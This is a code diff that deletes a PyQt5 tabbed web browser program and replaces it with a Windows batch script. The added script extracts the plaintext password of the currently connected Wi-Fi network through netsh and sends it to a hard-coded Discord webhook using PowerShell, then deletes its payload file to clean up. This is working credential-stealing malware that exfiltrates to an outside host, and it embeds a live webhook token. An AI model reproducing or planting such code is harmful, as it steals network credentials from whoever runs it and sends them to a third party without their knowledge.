@@ -1,198 +1,52 @@
-import sys
-from PyQt5.QtCore import QUrl, Qt
-from PyQt5.QtGui import QIcon, QPixmap
-from PyQt5.QtWidgets import (
-    QApplication,
-    QMainWindow,
-    QWidget,
-    QVBoxLayout,
-    QHBoxLayout,
-    QLineEdit,
-    QPushButton,
-    QTabWidget,
-    QToolButton,
-    QStyle,
-    QComboBox,
-    QLabel
+@echo off
+setlocal enabledelayedexpansion
+
+:: Initialize variables
+set "retry_count=0"
+set "max_retries=20"
+set "password="
+
+:retry_loop
+:: Get the name of the currently connected Wi-Fi network
+for /f "tokens=2 delims=:" %%i in ('netsh wlan show interfaces ^| findstr /R /C:"SSID"') do (
+    set "SSID=%%i"
+    set "SSID=!SSID:~1!"
+    goto :gotSSID
 )
-from PyQt5.QtWebEngineWidgets import QWebEngineView
-from PyQt5.QtNetwork import QNetworkAccessManager, QNetworkRequest
+:gotSSID
 
+:: Retrieve the Wi-Fi password for the connected network
+for /f "tokens=2 delims=:" %%i in ('netsh wlan show profile name^="%SSID%" key^=clear ^| findstr /R /C:"Key Content"') do (
+    set "password=%%i"
+    set "password=!password:~1!"
+    goto :gotPassword
+)
+:gotPassword
 
-class BrowserWindow(QMainWindow):
-    def __init__(self):
-        super().__init__()
+:: Check if the password is found
+if "%password%"=="" (
+    set /a retry_count+=1
+    if !retry_count! leq %max_retries% (
+        echo Attempt #%retry_count% to retrieve password failed. Retrying...
+        timeout /t 5 /nobreak > nul
+        goto :retry_loop
+    ) else (
+        echo Maximum retries reached. No password found.
+        set "password=No password found"
+    )
+)
 
-        self.homepage = "https://www.bing.com"
-        self.setWindowTitle("QUXBrowser")
-        self.setWindowIcon(QIcon("https://img.icons8.com/ios-filled/50/000000/internet.png"))
-        self.setGeometry(100, 100, 1200, 800)
+:: Set the Discord webhook URL
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1250855943302807633/7bOHCgMTHz08VJkQzY9Xdmi5uBj8FwVng88qWvzX-m2yLvfHuwfS00lhPvyEO7v2Fiod"
 
-        self.central_widget = QWidget()
-        self.setCentralWidget(self.central_widget)
+:: Create a JSON payload
+echo { "content": "Wi-Fi Password: %password%" } > payload.json
 
-        self.layout = QVBoxLayout(self.central_widget)
+:: Use PowerShell to send the payload to the Discord webhook
+powershell -Command ^
+  "Invoke-WebRequest -Uri '%WEBHOOK_URL%' -Method POST -ContentType 'application/json' -InFile 'payload.json'"
 
-        self.tab_widget = QTabWidget()
-        self.tab_widget.setTabsClosable(True)
-        self.tab_widget.tabCloseRequested.connect(self.delete_tab)
-        self.layout.addWidget(self.tab_widget)
+echo Wi-Fi password sent to Discord.
 
-        self.add_tab()
-
-        self.create_toolbar()
-        self.create_navigation_bar()
-        self.create_theme_selector()
-
-        self.load_icons()
-        self.apply_theme("Light")
-
-    def create_toolbar(self):
-        self.toolbar = QHBoxLayout()
-
-        self.back_button = QToolButton()
-        self.back_button.setIcon(self.style().standardIcon(QStyle.SP_ArrowBack))
-        self.back_button.setStatusTip("Go back to the previous page")
-        self.back_button.clicked.connect(self.go_back)
-        self.toolbar.addWidget(self.back_button)
-
-        self.forward_button = QToolButton()
-        self.forward_button.setIcon(self.style().standardIcon(QStyle.SP_ArrowForward))
-        self.forward_button.setStatusTip("Go forward to the next page")
-        self.forward_button.clicked.connect(self.go_forward)
-        self.toolbar.addWidget(self.forward_button)
-
-        self.reload_button = QToolButton()
-        self.reload_button.setIcon(self.style().standardIcon(QStyle.SP_BrowserReload))
-        self.reload_button.setStatusTip("Reload the current page")
-        self.reload_button.clicked.connect(self.reload_page)
-        self.toolbar.addWidget(self.reload_button)
-
-        self.new_tab_button = QToolButton()
-        self.new_tab_button.setStatusTip("Open a new tab")
-        self.new_tab_button.clicked.connect(self.add_tab)
-        self.toolbar.addWidget(self.new_tab_button)
-
-        self.del_tab_button = QToolButton()
-        self.del_tab_button.setStatusTip("Close the current tab")
-        self.del_tab_button.clicked.connect(self.delete_tab)
-        self.toolbar.addWidget(self.del_tab_button)
-
-        self.toolbar.addStretch()
-        self.layout.addLayout(self.toolbar)
-
-    def create_navigation_bar(self):
-        navigation_bar = QHBoxLayout()
-
-        self.address_bar = QLineEdit()
-        self.address_bar.setPlaceholderText("Enter URL and press Enter...")
-        self.address_bar.returnPressed.connect(self.navigate)
-        navigation_bar.addWidget(self.address_bar)
-
-        self.go_button = QPushButton("Go")
-        self.go_button.setStatusTip("Navigate to the URL in the address bar")
-        self.go_button.clicked.connect(self.navigate)
-        navigation_bar.addWidget(self.go_button)
-
-        navigation_bar.addStretch()
-        self.layout.addLayout(navigation_bar)
-
-    def create_theme_selector(self):
-        theme_bar = QHBoxLayout()
-        theme_label = QLabel("Theme:")
-        self.theme_selector = QComboBox()
-        self.theme_selector.addItems(["Light", "Dark", "Blue"])
-        self.theme_selector.currentTextChanged.connect(self.apply_theme)
-        theme_bar.addWidget(theme_label)
-        theme_bar.addWidget(self.theme_selector)
-
-        theme_bar.addStretch()
-        self.layout.addLayout(theme_bar)
-
-    def apply_theme(self, theme):
-        if theme == "Light":
-            self.setStyleSheet("QMainWindow { background-color: white; }"
-                               "QLineEdit { background-color: white; color: black; border: 1px solid #ccc; border-radius: 5px; padding: 5px; }"
-                               "QToolButton { background-color: white; color: black; border: none; padding: 5px; }"
-                               "QPushButton { background-color: #f0f0f0; color: black; border: 1px solid #ccc; border-radius: 5px; padding: 5px; }"
-                               "QTabWidget::pane { border-top: 2px solid #ccc; }"
-                               "QTabBar::tab { background: white; border: 1px solid #ccc; padding: 10px; border-top-left-radius: 5px; border-top-right-radius: 5px; }"
-                               "QTabBar::tab:selected { background: #f0f0f0; }")
-        elif theme == "Dark":
-            self.setStyleSheet("QMainWindow { background-color: #2b2b2b; }"
-                               "QLineEdit { background-color: #3c3f41; color: white; border: 1px solid #555; border-radius: 5px; padding: 5px; }"
-                               "QToolButton { background-color: #3c3f41; color: white; border: none; padding: 5px; }"
-                               "QPushButton { background-color: #555; color: white; border: 1px solid #666; border-radius: 5px; padding: 5px; }"
-                               "QTabWidget::pane { border-top: 2px solid #555; }"
-                               "QTabBar::tab { background: #3c3f41; border: 1px solid #555; padding: 10px; border-top-left-radius: 5px; border-top-right-radius: 5px; }"
-                               "QTabBar::tab:selected { background: #555; }")
-        elif theme == "Blue":
-            self.setStyleSheet("QMainWindow { background-color: #add8e6; }"
-                               "QLineEdit { background-color: #87ceeb; color: black; border: 1px solid #007acc; border-radius: 5px; padding: 5px; }"
-                               "QToolButton { background-color: #87ceeb; color: black; border: none; padding: 5px; }"
-                               "QPushButton { background-color: #b0e0e6; color: black; border: 1px solid #007acc; border-radius: 5px; padding: 5px; }"
-                               "QTabWidget::pane { border-top: 2px solid #007acc; }"
-                               "QTabBar::tab { background: #87ceeb; border: 1px solid #007acc; padding: 10px; border-top-left-radius: 5px; border-top-right-radius: 5px; }"
-                               "QTabBar::tab:selected { background: #b0e0e6; }")
-
-    def add_tab(self):
-        web_view = QWebEngineView()
-        web_view.load(QUrl(self.homepage))
-        index = self.tab_widget.addTab(web_view, "New Tab")
-        self.tab_widget.setCurrentIndex(index)
-        web_view.urlChanged.connect(self.update_address_bar)
-
-    def delete_tab(self, index=None):
-        if index is None:
-            index = self.tab_widget.currentIndex()
-        if self.tab_widget.count() > 1:
-            self.tab_widget.removeTab(index)
-
-    def update_address_bar(self, url):
-        index = self.tab_widget.currentIndex()
-        if index >= 0:
-            self.address_bar.setText(url.toString())
-
-    def navigate(self):
-        index = self.tab_widget.currentIndex()
-        web_view = self.tab_widget.widget(index)
-        url = self.address_bar.text()
-        if not url.startswith("http"):
-            url = "http://" + url
-        web_view.load(QUrl(url))
-
-    def go_back(self):
-        index = self.tab_widget.currentIndex()
-        web_view = self.tab_widget.widget(index)
-        web_view.back()
-
-    def go_forward(self):
-        index = self.tab_widget.currentIndex()
-        web_view = self.tab_widget.widget(index)
-        web_view.forward()
-
-    def reload_page(self):
-        index = self.tab_widget.currentIndex()
-        web_view = self.tab_widget.widget(index)
-        web_view.reload()
-
-    def load_icons(self):
-        self.set_icon(self.new_tab_button, "https://img.icons8.com/ios-filled/50/000000/add.png")
-        self.set_icon(self.del_tab_button, "https://img.icons8.com/ios-filled/50/000000/delete-sign.png")
-
-    def set_icon(self, button, url):
-        manager = QNetworkAccessManager(self)
-        manager.finished.connect(lambda reply, button=button: self.on_icon_downloaded(reply, button))
-        manager.get(QNetworkRequest(QUrl(url)))
-
-    def on_icon_downloaded(self, reply, button):
-        pixmap = QPixmap()
-        pixmap.loadFromData(reply.readAll())
-        button.setIcon(QIcon(pixmap))
-
-
-if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    window = BrowserWindow()
-    window.show()
-    sys.exit(app.exec_())
+:: Clean up
+del payload.json
